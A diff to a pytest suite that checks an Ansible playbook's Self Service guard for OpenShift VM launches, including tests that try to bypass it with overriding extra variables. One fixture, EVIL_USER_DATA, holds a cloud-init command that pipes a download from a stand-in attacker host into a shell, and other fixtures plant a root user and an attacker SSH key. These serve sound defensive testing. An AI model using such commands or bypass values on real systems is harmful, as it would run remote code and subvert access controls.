@@ -22,6 +22,7 @@ Every hostname, address and password is invented.
 """
 from __future__ import annotations
 
+import contextlib
 import json
 import os
 import re
@@ -433,7 +434,10 @@ def test_self_service_launch_inside_the_policy_uses_approved_values_only(lifecyc
             "'hostname: web-01' in cloud_init_user_data",
             "'ssh-ed25519 AAAA-fixture-key' in cloud_init_user_data",
             "'chpasswd' not in cloud_init_user_data and 'PermitRootLogin' not in cloud_init_user_data",
-            "(cloud_init_network_data | default('', true)) == ''",  # DHCP: no static address, as before
+            # DHCP: no static address. Exactly the empty string, not whitespace (Ansible re-adds a
+            # trailing newline to a template source that ends with one).
+            "cloud_init_network_data == '' and (cloud_init_network_data | length) == 0",
+            "ado_cloud_init_network_data_expected == '' and (ado_cloud_init_network_data_expected | length) == 0",
         ],
     )
     assert result.returncode == 0, result.stdout + result.stderr
@@ -466,11 +470,49 @@ def test_self_service_refuses_values_a_caller_adds_outside_the_survey(lifecycle)
     assert failures == []
 
 
+@contextlib.contextmanager
+def _policy_file(lifecycle, change):
+    """Rewrite the generated vars_openshift_virt.yml for one run and always put it back."""
+    path = lifecycle.env_dir / "vars_openshift_virt.yml"
+    original = path.read_bytes()
+    try:
+        document = yaml.safe_load(original)
+        change(document)
+        path.write_text(yaml.safe_dump(document, sort_keys=False))
+        yield
+    finally:
+        path.write_bytes(original)
+
+
 def test_self_service_refuses_when_the_policy_is_missing_or_disabled(lifecycle):
-    for policy in ('{"openshift_virt_self_service_policy": {"enabled": false}}', '{"openshift_virt_self_service_policy": {}}'):
-        result = _run_generated_virt_playbook(lifecycle, SELF_SERVICE_LAUNCH, raw=[policy])
-        assert _refused(result), policy
-        assert "not configured" in result.stdout + result.stderr
+    """The guard reads the policy from the project file, so the file is what disables Self Service."""
+
+    def disable(document):
+        document["openshift_virt_self_service_policy"]["enabled"] = False
+
+    def empty(document):
+        document["openshift_virt_self_service_policy"] = {}
+
+    def missing(document):
+        del document["openshift_virt_self_service_policy"]
+
+    for change in (disable, empty, missing):
+        with _policy_file(lifecycle, change):
+            result = _run_generated_virt_playbook(lifecycle, SELF_SERVICE_LAUNCH)
+        assert _refused(result), change.__name__
+        assert "not configured" in result.stdout + result.stderr, change.__name__
+    # and the file is back as generated: the approved launch works again
+    assert _run_generated_virt_playbook(lifecycle, SELF_SERVICE_LAUNCH).returncode == 0
+
+
+def test_self_service_refuses_a_policy_with_template_expressions(lifecycle):
+    def template(document):
+        document["openshift_virt_self_service_policy"]["defaults"]["storage_class"] = "{{ some_variable }}"
+
+    with _policy_file(lifecycle, template):
+        result = _run_generated_virt_playbook(lifecycle, SELF_SERVICE_LAUNCH)
+    assert _refused(result)
+    assert "template expressions" in result.stdout + result.stderr
 
 
 def test_self_service_refuses_a_size_the_namespace_quota_cannot_hold(lifecycle):
@@ -508,3 +550,133 @@ def test_advanced_template_is_not_restricted_and_keeps_its_behaviour(lifecycle):
     )
     assert result.returncode == 0, result.stdout + result.stderr
     assert "Self Service refused" not in result.stdout
+
+
+PERMISSIVE_POLICY = {
+    "enabled": True,
+    "images": [{"id": "custom-image", "label": "Custom", "preference": "rhel.10"}],
+    "sizes": [{"label": "Huge", "instance_type": "u1.8xlarge"}],
+    "namespaces": ["kube-system"],
+    "defaults": {
+        "storage_class": "fast", "network_mode": "bridge", "multus_network_name": "kube-system/x",
+        "root_disk_size": "900Gi", "source_namespace": "default", "cloud_user": "root",
+        "ssh_public_key": "ssh-ed25519 AAAA-attacker",
+    },
+}
+EVIL_USER_DATA = "#cloud-config\nruncmd:\n  - curl http://attacker.invalid/x | sh\n"
+OUT_OF_POLICY = {"provision_openshift_virt_namespace": "kube-system", "provision_openshift_virt_size": "Huge"}
+
+
+def _json_vars(**values):
+    return json.dumps(values)
+
+
+def test_self_service_cannot_be_bypassed_by_replacing_what_the_guard_used_to_trust(lifecycle):
+    """An extra variable beats every variable the play sets. Replace each internal one and still be refused.
+
+    Every attempt below also asks for something outside the approved policy, so a skipped or
+    weakened guard would let the run succeed.
+    """
+    evil_in_launch = {
+        **SELF_SERVICE_LAUNCH, "provision_openshift_virt_source_name": "custom-image",
+        "provision_openshift_virt_namespace": "kube-system",
+    }
+    attempts = {
+        "switch turned off": (evil_in_launch, [_json_vars(ado_vm_self_service=False)]),
+        "policy variable replaced": (evil_in_launch, [_json_vars(openshift_virt_self_service_policy=PERMISSIVE_POLICY)]),
+        "internal policy replaced": (evil_in_launch, [_json_vars(ado_vm_policy=PERMISSIVE_POLICY)]),
+        "internal defaults replaced": (SELF_SERVICE_LAUNCH, [_json_vars(ado_vm_defaults=PERMISSIVE_POLICY["defaults"])]),
+        "internal effective values replaced": (
+            SELF_SERVICE_LAUNCH,
+            [_json_vars(ado_vm_effective={}), "instance_type=u1.8xlarge"],
+        ),
+        "cloud-init and its expected text replaced together": (
+            SELF_SERVICE_LAUNCH,
+            [_json_vars(cloud_init_user_data=EVIL_USER_DATA, ado_cloud_init_user_data_expected=EVIL_USER_DATA)],
+        ),
+        "network data and its expected text replaced together": (
+            SELF_SERVICE_LAUNCH,
+            [_json_vars(cloud_init_network_data="version: 2", ado_cloud_init_network_data_expected="version: 2")],
+        ),
+        "extra user in cloud-init and expected text": (
+            SELF_SERVICE_LAUNCH,
+            [_json_vars(
+                ado_cloud_init_user_data_expected="#cloud-config\nhostname: web-01\nusers:\n  - name: root\n",
+                cloud_init_user_data="#cloud-config\nhostname: web-01\nusers:\n  - name: root\n",
+            )],
+        ),
+        "state absent through the namespace role only": (SELF_SERVICE_LAUNCH, ["state=absent", "vm_state=present"]),
+        "other project through the namespace role": (SELF_SERVICE_LAUNCH, ["ocp_namespace_name=kube-system"]),
+        "other project through the framework fact": (SELF_SERVICE_LAUNCH, ["name_space=kube-system"]),
+        "mode misspelled": ({**SELF_SERVICE_LAUNCH, "ado_vm_template_mode": "Self-Service"}, []),
+        "mode unknown": ({**SELF_SERVICE_LAUNCH, "ado_vm_template_mode": "selfservice"}, ["instance_type=u1.8xlarge"]),
+        "everything out of policy at once": (
+            {**SELF_SERVICE_LAUNCH, **OUT_OF_POLICY},
+            [_json_vars(ado_vm_self_service=False, ado_vm_policy=PERMISSIVE_POLICY,
+                        openshift_virt_self_service_policy=PERMISSIVE_POLICY, ado_vm_defaults=PERMISSIVE_POLICY["defaults"])],
+        ),
+    }
+    failures = []
+    for label, (launch, raw) in attempts.items():
+        result = _run_generated_virt_playbook(lifecycle, launch, raw=raw)
+        if not _refused(result):
+            failures.append(label)
+    assert failures == []
+
+
+def test_a_job_template_name_that_says_self_service_keeps_the_guard_on_when_the_mode_is_overridden(lifecycle):
+    """Second signal: AAP names the job template. Overriding the mode alone is not enough."""
+    template = _json_vars(awx_job_template_name="ADO | Create VM \u2014 Self Service")
+    overridden = {**SELF_SERVICE_LAUNCH, "ado_vm_template_mode": "advanced"}
+    refused = _run_generated_virt_playbook(
+        lifecycle, {**overridden, **OUT_OF_POLICY}, raw=[template, "instance_type=u1.8xlarge"]
+    )
+    assert _refused(refused)
+    # the template name alone also selects Self Service, with no mode at all
+    only_name = {k: v for k, v in SELF_SERVICE_LAUNCH.items() if k != "ado_vm_template_mode"}
+    assert _refused(_run_generated_virt_playbook(lifecycle, {**only_name, **OUT_OF_POLICY}, raw=[template]))
+    # an in-policy launch through that template still works, and takes the approved values
+    allowed = _run_generated_virt_playbook(
+        lifecycle, overridden, ["ado_vm_self_service | bool", "instance_type == 'u1.large'"], raw=[template]
+    )
+    assert allowed.returncode == 0, allowed.stdout + allowed.stderr
+    tower = _json_vars(tower_job_template_name="ADO | Create VM \u2014 Self Service")
+    assert _refused(_run_generated_virt_playbook(lifecycle, {**overridden, **OUT_OF_POLICY}, raw=[tower]))
+
+
+def test_residual_limitation_the_mode_variable_is_the_only_switch_without_an_aap_job_template_name(lifecycle):
+    """Documents what a playbook cannot do. This is not a feature.
+
+    If an extra variable named ado_vm_template_mode reaches the play, and AAP does not also
+    name a Self Service job template, the play treats the run as Advanced and does not guard it.
+    Nothing inside one shared playbook can prevent that, because an extra variable has higher
+    precedence than every variable the playbook sets. The control is outside the playbook:
+    the Self Service job template must not accept launch variables (and workflow nodes must not
+    pass them), and only intended users may launch it. See the ocp_virtualization README.
+    """
+    result = _run_generated_virt_playbook(
+        lifecycle,
+        {**SELF_SERVICE_LAUNCH, "ado_vm_template_mode": "advanced", **OUT_OF_POLICY},
+        raw=["instance_type=u1.8xlarge"],
+    )
+    assert result.returncode == 0 and "Self Service refused" not in result.stdout
+
+
+def test_advanced_template_dhcp_network_data_is_exactly_empty_and_static_is_unchanged(lifecycle):
+    base = {"env": ENV, "state": "present", "provision_openshift_virt_namespace": "any-namespace",
+            "provision_openshift_virt_vm_name": "adv-1", "provision_openshift_virt_source_name": "rhel9"}
+    dhcp = _run_generated_virt_playbook(
+        lifecycle, base,
+        ["cloud_init_network_data == ''", "ado_cloud_init_network_data_expected == ''"],
+        raw=["provision_openshift_virt_static_ip="],
+    )
+    assert dhcp.returncode == 0, dhcp.stdout + dhcp.stderr
+    static = _run_generated_virt_playbook(
+        lifecycle, {**base, "provision_openshift_virt_static_ip": "10.77.0.150"},
+        [
+            "cloud_init_network_data.startswith('version: 2\\n')",
+            "cloud_init_network_data.endswith('\\n') and not cloud_init_network_data.endswith('\\n\\n')",
+            "'10.77.0.150/24' in cloud_init_network_data",
+        ],
+    )
+    assert static.returncode == 0, static.stdout + static.stderr
